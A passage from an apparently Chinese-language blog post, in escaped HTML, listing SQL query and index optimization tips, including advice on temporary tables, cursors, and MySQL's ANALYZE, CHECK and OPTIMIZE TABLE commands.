&#x4EE3;&#x7801; : create table <span class=\"comment\">#t(&#x2026;);</span></span><br></pre></td></tr></table></figure></p>\n<p>13&#x3001;&#x5F88;&#x591A;&#x65F6;&#x5019;&#x7528; exists &#x4EE3;&#x66FF; in &#x662F;&#x4E00;&#x4E2A;&#x597D;&#x7684;&#x9009;&#x62E9;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select num from a <span class=\"built_in\">where</span> num <span class=\"keyword\">in</span>(select num from b);</span><br></pre></td></tr></table></figure></p>\n<p>&#x7528;&#x4E0B;&#x9762;&#x7684;&#x8BED;&#x53E5;&#x66FF;&#x6362;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select num from a <span class=\"built_in\">where</span> exists(select 1 from b <span class=\"built_in\">where</span> num=a&#x3001;num);</span><br></pre></td></tr></table></figure></p>\n<p>14&#x3001;&#x5E76;&#x4E0D;&#x662F;&#x6240;&#x6709;&#x7D22;&#x5F15;&#x5BF9;&#x67E5;&#x8BE2;&#x90FD;&#x6709;&#x6548;&#xFF0C;SQL &#x662F;&#x6839;&#x636E;&#x8868;&#x4E2D;&#x6570;&#x636E;&#x6765;&#x8FDB;&#x884C;&#x67E5;&#x8BE2;&#x4F18;&#x5316;&#x7684;&#xFF0C;&#x5F53;&#x7D22;&#x5F15;&#x5217;&#x6709;&#x5927;&#x91CF;&#x6570;&#x636E;&#x91CD;&#x590D;&#x65F6;&#xFF0C; SQL &#x67E5;&#x8BE2;&#x53EF;&#x80FD;&#x4E0D;&#x4F1A;&#x53BB;&#x5229;&#x7528;&#x7D22;&#x5F15;&#xFF0C;&#x5982;&#x4E00;&#x8868;&#x4E2D;&#x6709;&#x5B57;&#x6BB5; <strong><em>,male&#x3001;female &#x51E0;&#x4E4E;&#x5404;&#x4E00;&#x534A;&#xFF0C;&#x90A3;&#x4E48;&#x5373;&#x4F7F;&#x5728; </em></strong> &#x4E0A;&#x5EFA; &#x4E86;&#x7D22;&#x5F15;&#x4E5F;&#x5BF9;&#x67E5;&#x8BE2;&#x6548;&#x7387;&#x8D77;&#x4E0D;&#x4E86;&#x4F5C;&#x7528;&#x3002;</p>\n<p>15&#x3001;&#x7D22;&#x5F15;&#x5E76;&#x4E0D;&#x662F;&#x8D8A;&#x591A;&#x8D8A;&#x597D;&#xFF0C;&#x7D22;&#x5F15;&#x56FA;&#x7136;&#x53EF;&#x4EE5;&#x63D0;&#x9AD8;&#x76F8;&#x5E94;&#x7684; select &#x7684;&#x6548;&#x7387;&#xFF0C;&#x4F46;&#x540C;&#x65F6;&#x4E5F;&#x964D;&#x4F4E;&#x4E86; insert &#x53CA; update &#x7684;&#x6548;&#x7387;&#xFF0C;&#x56E0;&#x4E3A; insert &#x6216; update &#x65F6;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x91CD;&#x5EFA;&#x7D22;&#x5F15;&#xFF0C;&#x6240;&#x4EE5;&#x600E;&#x6837;&#x5EFA;&#x7D22;&#x5F15;&#x9700;&#x8981;&#x614E;&#x91CD;&#x8003;&#x8651;&#xFF0C;&#x89C6;&#x5177;&#x4F53;&#x60C5;&#x51B5;&#x800C;&#x5B9A;&#x3002;&#x4E00;&#x4E2A;&#x8868;&#x7684;&#x7D22;&#x5F15;&#x6570;&#x6700;&#x597D;&#x4E0D;&#x8981;&#x8D85;&#x8FC7; 6 &#x4E2A;&#xFF0C;&#x82E5;&#x592A;&#x591A;&#x5219;&#x5E94;&#x8003;&#x8651;&#x4E00;&#x4E9B;&#x4E0D;&#x5E38;&#x4F7F;&#x7528;&#x5230;&#x7684;&#x5217;&#x4E0A;&#x5EFA;&#x7684;&#x7D22;&#x5F15;&#x662F;&#x5426;&#x6709;&#x5FC5;&#x8981;&#x3002;</p>\n<p>16&#x3001;&#x5E94;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x907F;&#x514D;&#x66F4;&#x65B0; clustered &#x7D22;&#x5F15;&#x6570;&#x636E;&#x5217;&#xFF0C; &#x56E0;&#x4E3A; clustered &#x7D22;&#x5F15;&#x6570;&#x636E;&#x5217;&#x7684;&#x987A;&#x5E8F;&#x5C31;&#x662F;&#x8868;&#x8BB0;&#x5F55;&#x7684;&#x7269;&#x7406;&#x5B58;&#x50A8;&#x987A;&#x5E8F;&#xFF0C;&#x4E00;&#x65E6;&#x8BE5;&#x5217;&#x503C;&#x6539;&#x53D8;&#x5C06;&#x5BFC;&#x81F4;&#x6574;&#x4E2A;&#x8868;&#x8BB0;&#x5F55;&#x7684;&#x987A;&#x5E8F;&#x7684;&#x8C03;&#x6574;&#xFF0C;&#x4F1A;&#x8017;&#x8D39;&#x76F8;&#x5F53;&#x5927;&#x7684;&#x8D44;&#x6E90;&#x3002;&#x82E5;&#x5E94;&#x7528;&#x7CFB;&#x7EDF;&#x9700;&#x8981;&#x9891;&#x7E41;&#x66F4;&#x65B0; clustered &#x7D22;&#x5F15;&#x6570;&#x636E;&#x5217;&#xFF0C;&#x90A3;&#x4E48;&#x9700;&#x8981;&#x8003;&#x8651;&#x662F;&#x5426;&#x5E94;&#x5C06;&#x8BE5;&#x7D22;&#x5F15;&#x5EFA;&#x4E3A; clustered &#x7D22;&#x5F15;&#x3002;</p>\n<p>17&#x3001;&#x5C3D;&#x91CF;&#x4F7F;&#x7528;&#x6570;&#x5B57;&#x578B;&#x5B57;&#x6BB5;&#xFF0C;&#x82E5;&#x53EA;&#x542B;&#x6570;&#x503C;&#x4FE1;&#x606F;&#x7684;&#x5B57;&#x6BB5;&#x5C3D;&#x91CF;&#x4E0D;&#x8981;&#x8BBE;&#x8BA1;&#x4E3A;&#x5B57;&#x7B26;&#x578B;&#xFF0C;&#x8FD9;&#x4F1A;&#x964D;&#x4F4E;&#x67E5;&#x8BE2;&#x548C;&#x8FDE;&#x63A5;&#x7684;&#x6027;&#x80FD;&#xFF0C;&#x5E76; &#x4F1A;&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x5F00;&#x9500;&#x3002;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x5F15;&#x64CE;&#x5728;&#x5904;&#x7406;&#x67E5;&#x8BE2;&#x548C;&#x8FDE;&#x63A5;&#x65F6;&#x4F1A;&#x9010;&#x4E2A;&#x6BD4;&#x8F83;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x6BCF;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x800C;&#x5BF9;&#x4E8E;&#x6570;&#x5B57;&#x578B;&#x800C;&#x8A00; &#x53EA;&#x9700;&#x8981;&#x6BD4;&#x8F83;&#x4E00;&#x6B21;&#x5C31;&#x591F;&#x4E86;&#x3002;</p>\n<p>18&#x3001;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x4F7F;&#x7528; varchar/nvarchar &#x4EE3;&#x66FF; char/nchar , &#x56E0;&#x4E3A;&#x9996;&#x5148;&#x53D8;&#x957F;&#x5B57;&#x6BB5;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x5C0F;&#xFF0C; &#x53EF;&#x4EE5;&#x8282;&#x7701;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#xFF0C; &#x5176;&#x6B21;&#x5BF9;&#x4E8E;&#x67E5;&#x8BE2;&#x6765;&#x8BF4;&#xFF0C;&#x5728;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x8F83;&#x5C0F;&#x7684;&#x5B57;&#x6BB5;&#x5185;&#x641C;&#x7D22;&#x6548;&#x7387;&#x663E;&#x7136;&#x8981;&#x9AD8;&#x4E9B;&#x3002;</p>\n<p>19&#x3001;&#x4EFB;&#x4F55;&#x5730;&#x65B9;&#x90FD;&#x4E0D;&#x8981;&#x4F7F;&#x7528; select <em> from t ,&#x7528;&#x5177;&#x4F53;&#x7684;&#x5B57;&#x6BB5;&#x5217;&#x8868;&#x4EE3;&#x66FF;&#x201C;</em>&#x201D;,&#x4E0D;&#x8981;&#x8FD4;&#x56DE;&#x7528;&#x4E0D;&#x5230;&#x7684;&#x4EFB;&#x4F55;&#x5B57;&#x6BB5;&#x3002;</p>\n<p>20&#x3001;&#x5C3D;&#x91CF;&#x4F7F;&#x7528;&#x8868;&#x53D8;&#x91CF;&#x6765;&#x4EE3;&#x66FF;&#x4E34;&#x65F6;&#x8868;&#x3002;&#x5982;&#x679C;&#x8868;&#x53D8;&#x91CF;&#x5305;&#x542B;&#x5927;&#x91CF;&#x6570;&#x636E;&#xFF0C;&#x8BF7;&#x6CE8;&#x610F;&#x7D22;&#x5F15;&#x975E;&#x5E38;&#x6709;&#x9650;(&#x53EA;&#x6709;&#x4E3B;&#x952E;&#x7D22;&#x5F15;)&#x3002;</p>\n<p>21&#x3001;&#x907F;&#x514D;&#x9891;&#x7E41;&#x521B;&#x5EFA;&#x548C;&#x5220;&#x9664;&#x4E34;&#x65F6;&#x8868;&#xFF0C;&#x4EE5;&#x51CF;&#x5C11;&#x7CFB;&#x7EDF;&#x8868;&#x8D44;&#x6E90;&#x7684;&#x6D88;&#x8017;&#x3002;</p>\n<p>22&#x3001;&#x4E34;&#x65F6;&#x8868;&#x5E76;&#x4E0D;&#x662F;&#x4E0D;&#x53EF;&#x4F7F;&#x7528;&#xFF0C;&#x9002;&#x5F53;&#x5730;&#x4F7F;&#x7528;&#x5B83;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x67D0;&#x4E9B;&#x4F8B;&#x7A0B;&#x66F4;&#x6709;&#x6548;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x5F53;&#x9700;&#x8981;&#x91CD;&#x590D;&#x5F15;&#x7528;&#x5927;&#x578B;&#x8868;&#x6216;&#x5E38;&#x7528; &#x8868;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x6570;&#x636E;&#x96C6;&#x65F6;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E00;&#x6B21;&#x6027;&#x4E8B;&#x4EF6;&#xFF0C; &#x6700;&#x597D;&#x4F7F;&#x7528;&#x5BFC;&#x51FA;&#x8868;&#x3002;</p>\n<p>23&#x3001;&#x5728;&#x65B0;&#x5EFA;&#x4E34;&#x65F6;&#x8868;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x4E00;&#x6B21;&#x6027;&#x63D2;&#x5165;&#x6570;&#x636E;&#x91CF;&#x5F88;&#x5927;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; select into &#x4EE3;&#x66FF; create table,&#x907F;&#x514D;&#x9020;&#x6210;&#x5927;&#x91CF; log ,&#x4EE5;&#x63D0;&#x9AD8;&#x901F;&#x5EA6;;&#x5982;&#x679C;&#x6570;&#x636E;&#x91CF;&#x4E0D;&#x5927;&#xFF0C;&#x4E3A;&#x4E86;&#x7F13;&#x548C;&#x7CFB;&#x7EDF;&#x8868;&#x7684;&#x8D44;&#x6E90;&#xFF0C;&#x5E94;&#x5148; create table,&#x7136;&#x540E; insert&#x3001;</p>\n<p>24&#x3001;&#x5982;&#x679C;&#x4F7F;&#x7528;&#x5230;&#x4E86;&#x4E34;&#x65F6;&#x8868;&#xFF0C; &#x5728;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x7684;&#x6700;&#x540E;&#x52A1;&#x5FC5;&#x5C06;&#x6240;&#x6709;&#x7684;&#x4E34;&#x65F6;&#x8868;&#x663E;&#x5F0F;&#x5220;&#x9664;&#xFF0C; &#x5148; truncate table ,&#x7136;&#x540E; drop table ,&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x907F;&#x514D;&#x7CFB;&#x7EDF;&#x8868;&#x7684;&#x8F83;&#x957F;&#x65F6;&#x95F4;&#x9501;&#x5B9A;&#x3002;</p>\n<p>25&#x3001;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x4F7F;&#x7528;&#x6E38;&#x6807;&#xFF0C;&#x56E0;&#x4E3A;&#x6E38;&#x6807;&#x7684;&#x6548;&#x7387;&#x8F83;&#x5DEE;&#xFF0C;&#x5982;&#x679C;&#x6E38;&#x6807;&#x64CD;&#x4F5C;&#x7684;&#x6570;&#x636E;&#x8D85;&#x8FC7; 1 &#x4E07;&#x884C;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x5E94;&#x8BE5;&#x8003;&#x8651;&#x6539;&#x5199;&#x3002;</p>\n<p>26&#x3001;&#x4F7F;&#x7528;&#x57FA;&#x4E8E;&#x6E38;&#x6807;&#x7684;&#x65B9;&#x6CD5;&#x6216;&#x4E34;&#x65F6;&#x8868;&#x65B9;&#x6CD5;&#x4E4B;&#x524D;&#xFF0C;&#x5E94;&#x5148;&#x5BFB;&#x627E;&#x57FA;&#x4E8E;&#x96C6;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x6765;&#x89E3;&#x51B3;&#x95EE;&#x9898;&#xFF0C;&#x57FA;&#x4E8E;&#x96C6;&#x7684;&#x65B9;&#x6CD5;&#x901A;&#x5E38;&#x66F4; &#x6709;&#x6548;&#x3002;</p>\n<p>27&#x3001;&#x4E0E;&#x4E34;&#x65F6;&#x8868;&#x4E00;&#x6837;&#xFF0C;&#x6E38;&#x6807;&#x5E76;&#x4E0D;&#x662F;&#x4E0D;&#x53EF;&#x4F7F;&#x7528;&#x3002;&#x5BF9;&#x5C0F;&#x578B;&#x6570;&#x636E;&#x96C6;&#x4F7F;&#x7528; FAST_FORWARD &#x6E38;&#x6807;&#x901A;&#x5E38;&#x8981;&#x4F18;&#x4E8E;&#x5176;&#x4ED6;&#x9010;&#x884C;&#x5904;&#x7406;&#x65B9;&#x6CD5;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x5728;&#x5FC5;&#x987B;&#x5F15;&#x7528;&#x51E0;&#x4E2A;&#x8868;&#x624D;&#x80FD;&#x83B7;&#x5F97;&#x6240;&#x9700;&#x7684;&#x6570;&#x636E;&#x65F6;&#x3002;&#x5728;&#x7ED3;&#x679C;&#x96C6;&#x4E2D;&#x5305;&#x62EC;&#x201C;&#x5408;&#x8BA1;&#x201D;&#x7684;&#x4F8B;&#x7A0B;&#x901A;&#x5E38;&#x8981;&#x6BD4;&#x4F7F;&#x7528;&#x6E38;&#x6807;&#x6267;&#x884C;&#x7684;&#x901F;&#x5EA6;&#x5FEB;&#x3002;&#x5982;&#x679C;&#x5F00;&#x53D1;&#x65F6;&#x95F4;&#x5141;&#x8BB8;&#xFF0C;&#x57FA;&#x4E8E;&#x6E38;&#x6807;&#x7684;&#x65B9;&#x6CD5;&#x548C;&#x57FA;&#x4E8E;&#x96C6;&#x7684;&#x65B9;&#x6CD5;&#x90FD;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B;&#xFF0C;&#x770B;&#x54EA;&#x4E00;&#x79CD;&#x65B9;&#x6CD5;&#x7684;&#x6548;&#x679C;&#x66F4;&#x597D;&#x3002;</p>\n<p>28&#x3001;&#x5728;&#x6240;&#x6709;&#x7684;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x548C;&#x89E6;&#x53D1;&#x5668;&#x7684;&#x5F00;&#x59CB;&#x5904;&#x8BBE;&#x7F6E; SET NOCOUNT ON ,&#x5728;&#x7ED3;&#x675F;&#x65F6;&#x8BBE;&#x7F6E; SET NOCOUNT OFF &#x3001;&#x65E0;&#x9700;&#x5728;&#x6267;&#x884C;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x548C;&#x89E6;&#x53D1;&#x5668;&#x7684;&#x6BCF;&#x4E2A;&#x8BED;&#x53E5;&#x540E;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001; DONE_IN_PROC &#x6D88;&#x606F;&#x3002;</p>\n<p>29&#x3001;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5927;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#xFF0C;&#x63D0;&#x9AD8;&#x7CFB;&#x7EDF;&#x5E76;&#x53D1;&#x80FD;&#x529B;&#x3002; sql &#x4F18;&#x5316;&#x65B9;&#x6CD5;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x6765;&#x66F4;&#x5FEB;&#x5730;&#x904D;&#x5386;&#x8868;&#x3002; &#x7F3A;&#x7701;&#x60C5;&#x51B5;&#x4E0B;&#x5EFA;&#x7ACB;&#x7684;&#x7D22;&#x5F15;&#x662F;&#x975E;&#x7FA4;&#x96C6;&#x7D22;&#x5F15;&#xFF0C;&#x4F46;&#x6709;&#x65F6;&#x5B83;&#x5E76;&#x4E0D;&#x662F;&#x6700;&#x4F73;&#x7684;&#x3002;&#x5728;&#x975E;&#x7FA4;&#x96C6;&#x7D22;&#x5F15;&#x4E0B;&#xFF0C;&#x6570;&#x636E;&#x5728;&#x7269;&#x7406;&#x4E0A;&#x968F;&#x673A;&#x5B58;&#x653E;&#x5728;&#x6570;&#x636E;&#x9875;&#x4E0A;&#x3002;&#x5408;&#x7406;&#x7684;&#x7D22;&#x5F15;&#x8BBE;&#x8BA1;&#x8981;&#x5EFA;&#x7ACB;&#x5728;&#x5BF9;&#x5404;&#x79CD;&#x67E5;&#x8BE2;&#x7684;&#x5206;&#x6790;&#x548C;&#x9884;&#x6D4B;&#x4E0A;&#x3002;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF1A;</p>\n<p>a&#x3001;&#x6709;&#x5927;&#x91CF;&#x91CD;&#x590D;&#x503C;&#x3001;&#x4E14;&#x7ECF;&#x5E38;&#x6709;&#x8303;&#x56F4;&#x67E5;&#x8BE2;( &gt; ,&lt; ,&gt; =,&lt; =)&#x548C; order by&#x3001;group by &#x53D1;&#x751F;&#x7684;&#x5217;&#xFF0C;&#x53EF;&#x8003;&#x8651;&#x5EFA;&#x7ACB;&#x96C6;&#x7FA4;&#x7D22;&#x5F15;;</p>\n<p>b&#x3001;&#x7ECF;&#x5E38;&#x540C;&#x65F6;&#x5B58;&#x53D6;&#x591A;&#x5217;&#xFF0C;&#x4E14;&#x6BCF;&#x5217;&#x90FD;&#x542B;&#x6709;&#x91CD;&#x590D;&#x503C;&#x53EF;&#x8003;&#x8651;&#x5EFA;&#x7ACB;&#x7EC4;&#x5408;&#x7D22;&#x5F15;;</p>\n<p>c&#x3001;&#x7EC4;&#x5408;&#x7D22;&#x5F15;&#x8981;&#x5C3D;&#x91CF;&#x4F7F;&#x5173;&#x952E;&#x67E5;&#x8BE2;&#x5F62;&#x6210;&#x7D22;&#x5F15;&#x8986;&#x76D6;&#xFF0C;&#x5176;&#x524D;&#x5BFC;&#x5217;&#x4E00;&#x5B9A;&#x662F;&#x4F7F;&#x7528;&#x6700;&#x9891;&#x7E41;&#x7684;&#x5217;&#x3002;&#x7D22;&#x5F15;&#x867D;&#x6709;&#x52A9;&#x4E8E;&#x63D0;&#x9AD8;&#x6027;&#x80FD;&#x4F46; &#x4E0D;&#x662F;&#x7D22;&#x5F15;&#x8D8A;&#x591A;&#x8D8A;&#x597D;&#xFF0C;&#x6070;&#x597D;&#x76F8;&#x53CD;&#x8FC7;&#x591A;&#x7684;&#x7D22;&#x5F15;&#x4F1A;&#x5BFC;&#x81F4;&#x7CFB;&#x7EDF;&#x4F4E;&#x6548;&#x3002;&#x7528;&#x6237;&#x5728;&#x8868;&#x4E2D;&#x6BCF;&#x52A0;&#x8FDB;&#x4E00;&#x4E2A;&#x7D22;&#x5F15;&#xFF0C;&#x7EF4;&#x62A4;&#x7D22;&#x5F15;&#x96C6;&#x5408;&#x5C31; &#x8981;&#x505A;&#x76F8;&#x5E94;&#x7684;&#x66F4;&#x65B0;&#x5DE5;&#x4F5C;&#x3002;</p>\n<p>30&#x3001;&#x5B9A;&#x671F;&#x5206;&#x6790;&#x8868;&#x548C;&#x68C0;&#x67E5;&#x8868;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x5206;&#x6790;&#x8868;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;ANALYZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE tb1_name[, tbl_name]&#x3001;&#x3001;&#x3001;</span><br></pre></td></tr></table></figure></p>\n<p>&#x4EE5;&#x4E0A;&#x8BED;&#x53E5;&#x7528;&#x4E8E;&#x5206;&#x6790;&#x548C;&#x5B58;&#x50A8;&#x8868;&#x7684;&#x5173;&#x952E;&#x5B57;&#x5206;&#x5E03;&#xFF0C;&#x5206;&#x6790;&#x7684;&#x7ED3;&#x679C;&#x5C06;&#x53EF;&#x4EE5;&#x4F7F;&#x5F97;&#x7CFB;&#x7EDF;&#x5F97;&#x5230;&#x51C6;&#x786E;&#x7684;&#x7EDF;&#x8BA1;&#x4FE1;&#x606F;&#xFF0C;&#x4F7F;&#x5F97;SQL&#x80FD;&#x591F;&#x751F;&#x6210;&#x6B63;&#x786E;&#x7684;&#x6267;&#x884C;&#x8BA1;&#x5212;&#x3002;&#x5982;&#x679C;&#x7528;&#x6237;&#x611F;&#x89C9;&#x5B9E;&#x9645;&#x6267;&#x884C;&#x8BA1;&#x5212;&#x5E76;&#x4E0D;&#x662F;&#x9884;&#x671F;&#x7684;&#x6267;&#x884C;&#x8BA1;&#x5212;&#xFF0C;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x5206;&#x6790;&#x8868;&#x53EF;&#x80FD;&#x4F1A;&#x89E3;&#x51B3;&#x95EE;&#x9898;&#x3002;&#x5728;&#x5206;&#x6790;&#x671F;&#x95F4;&#xFF0C;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x8BFB;&#x53D6;&#x9501;&#x5B9A;&#x5BF9;&#x8868;&#x8FDB;&#x884C;&#x9501;&#x5B9A;&#x3002;&#x8FD9;&#x5BF9;&#x4E8E;MyISAM&#xFF0C;DBD&#x548C;InnoDB&#x8868;&#x6709;&#x4F5C;&#x7528;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x4F8B;&#x5982;&#x5206;&#x6790;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x8868;&#xFF1A;analyze table table_name</span><br><span class=\"line\">&#x68C0;&#x67E5;&#x8868;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;CHECK TABLE tb1_name[,tbl_name]&#x3001;&#x3001;&#x3001;[option]&#x3001;&#x3001;&#x3001;option = {QUICK | FAST | MEDIUM | EXTENDED | CHANGED}</span><br></pre></td></tr></table></figure></p>\n<p>&#x68C0;&#x67E5;&#x8868;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x68C0;&#x67E5;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x8868;&#x662F;&#x5426;&#x6709;&#x9519;&#x8BEF;&#xFF0C;CHECK TABLE &#x5BF9;MyISAM &#x548C; InnoDB&#x8868;&#x6709;&#x4F5C;&#x7528;&#xFF0C;&#x5BF9;&#x4E8E;MyISAM&#x8868;&#xFF0C;&#x5173;&#x952E;&#x5B57;&#x7EDF;&#x8BA1;&#x6570;&#x636E;&#x88AB;&#x66F4;&#x65B0;</p>\n<p>CHECK TABLE &#x4E5F;&#x53EF;&#x4EE5;&#x68C0;&#x67E5;&#x89C6;&#x56FE;&#x662F;&#x5426;&#x6709;&#x9519;&#x8BEF;&#xFF0C;&#x6BD4;&#x5982;&#x5728;&#x89C6;&#x56FE;&#x5B9A;&#x4E49;&#x4E2D;&#x88AB;&#x5F15;&#x7528;&#x7684;&#x8868;&#x4E0D;&#x5B58;&#x5728;&#x3002;</p>\n<p>31&#x3001;&#x5B9A;&#x671F;&#x4F18;&#x5316;&#x8868;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x4F18;&#x5316;&#x8868;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;OPTIMIZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE tb1_name [,tbl_name]&#x3001;&#x3001;&#x3001;</span><br></pre></td></tr></table></figure></p>\n<p>&#x5982;&#x679C;&#x5220;&#x9664;&#x4E86;&#x8868;&#x7684;&#x4E00;&#x5927;&#x90E8;&#x5206;&#xFF0C;&#x6216;&#x8005;&#x5982;&#x679C;&#x5DF2;&#x7ECF;&#x5BF9;&#x542B;&#x6709;&#x53EF;&#x53D8;&#x957F;&#x5EA6;&#x884C;&#x7684;&#x8868;(&#x542B;&#x6709; VARCHAR&#x3001;BLOB&#x6216;TEXT&#x5217;&#x7684;&#x8868;)&#x8FDB;&#x884C;&#x66F4;&#x591A;&#x66F4;&#x6539;&#xFF0C;&#x5219;&#x5E94;&#x4F7F;&#x7528;OPTIMIZE TABLE&#x547D;&#x4EE4;&#x6765;&#x8FDB;&#x884C;&#x8868;&#x4F18;&#x5316;&#x3002;&#x8FD9;&#x4E2A;&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x5C06;&#x8868;&#x4E2D;&#x7684;&#x7A7A;&#x95F4;&#x788E;&#x7247;&#x8FDB;&#x884C;&#x5408;&#x5E76;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x6D88;&#x9664;&#x7531;&#x4E8E;&#x5220;&#x9664;&#x6216;&#x8005;&#x66F4;&#x65B0;&#x9020;&#x6210;&#x7684;&#x7A7A;&#x95F4;&#x6D6A;&#x8D39;&#xFF0C;&#x4F46;OPTIMIZE TABLE &#x547D;&#x4EE4;&#x53EA;&#x5BF9;MyISAM&#x3001; BDB &#x548C;InnoDB&#x8868;&#x8D77;&#x4F5C;&#x7528;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x4F8B;&#x5982;&#xFF1A; optimize table table_name</span><br></pre></td></tr></table></figure></p>\n<p>&#x6CE8;&#x610F;&#xFF1A; analyze&#x3001;check&#x3001;optimize&#x6267;&#x884C;&#x671F;&#x95F4;&#x5C06;&#x5BF9;&#x8868;&#x8FDB;&#x884C;&#x9501;&#x5B9A;&#xFF0C;&#x56E0;&#x6B64;&#x4E00;&#x5B9A;&#x6CE8;&#x610F;&#x8981;&#x5728;MySQL&#x6570;&#x636E;&#x5E93;&#x4E0D;&#x7E41;&#x5FD9;&#x7684;&#x65F6;&#x5019;&#x6267;&#x884C;&#x76F8;&#x5173;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p>\n<p>&#x8865;&#x5145;&#xFF1A;<br>1&#x3001;&#x5728;&#x6D77;&#x91CF;&#x67E5;&#x8BE2;&#x65F6;&#x5C3D;&#x91CF;&#x5C11;&#x7528;&#x683C;&#x5F0F;&#x8F6C;&#x6362;&#x3002;<br>2&#x3001;ORDER BY &#x548C; GROPU BY:&#x4F7F;&#x7528; ORDER BY &#x548C; GROUP BY &#x77ED;&#x8BED;&#xFF0C;&#x4EFB;&#x4F55;&#x4E00;&#x79CD;&#x7D22;&#x5F15;&#x90FD;&#x6709;&#x52A9;&#x4E8E; SELECT &#x7684;&#x6027;&#x80FD;&#x63D0;&#x9AD8;&#x3002;<br>3&#x3001;&#x4EFB;&#x4F55;&#x5BF9;&#x5217;&#x7684;&#x64CD;&#x4F5C;&#x90FD;&#x5C06;&#x5BFC;&#x81F4;&#x8868;&#x626B;&#x63CF;&#xFF0C;&#x5B83;&#x5305;&#x62EC;&#x6570;&#x636E;&#x5E93;&#x6559;&#x7A0B;&#x51FD;&#x6570;&#x3001;&#x8BA1;&#x7B97;&#x8868;&#x8FBE;&#x5F0F;&#x7B49;&#x7B49;&#xFF0C;&#x67E5;&#x8BE2;&#x65F6;&#x8981;&#x5C3D;&#x53EF;&#x80FD;&#x5C06;&#x64CD;&#x4F5C;&#x79FB; &#x81F3;&#x7B49;&#x53F7;&#x53F3;&#x8FB9;&#x3002;<br>4&#x3001;IN&#x3001;OR &#x5B50;&#x53E5;&#x5E38;&#x4F1A;&#x4F7F;&#x7528;&#x5DE5;&#x4F5C;&#x8868;&#xFF0C;&#x4F7F;&#x7D22;&#x5F15;&#x5931;&#x6548;&#x3002;&#x5982;&#x679C;&#x4E0D;&#x4EA7;&#x751F;&#x5927;&#x91CF;&#x91CD;&#x590D;&#x503C;&#xFF0C;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x628A;&#x5B50;&#x53E5;&#x62C6;&#x5F00;&#x3002;&#x62C6;&#x5F00;&#x7684;&#x5B50; &#x53E5;&#x4E2D;&#x5E94;&#x8BE5;&#x5305;&#x542B;&#x7D22;&#x5F15;&#x3002;<br>5&#x3001;&#x53EA;&#x8981;&#x80FD;&#x6EE1;&#x8DB3;&#x4F60;&#x7684;&#x9700;&#x6C42;&#xFF0C;&#x5E94;&#x5C3D;&#x53EF;&#x80FD;&#x4F7F;&#x7528;&#x66F4;&#x5C0F;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF1A;&#x4F8B;&#x5982;&#x4F7F;&#x7528; MEDIUMINT &#x4EE3;&#x66FF; INT<br>6&#x3001;&#x5C3D;&#x91CF;&#x628A;&#x6240;&#x6709;&#x7684;&#x5217;&#x8BBE;&#x7F6E;&#x4E3A; NOT NULL,&#x5982;&#x679C;&#x4F60;&#x8981;&#x4FDD;&#x5B58; 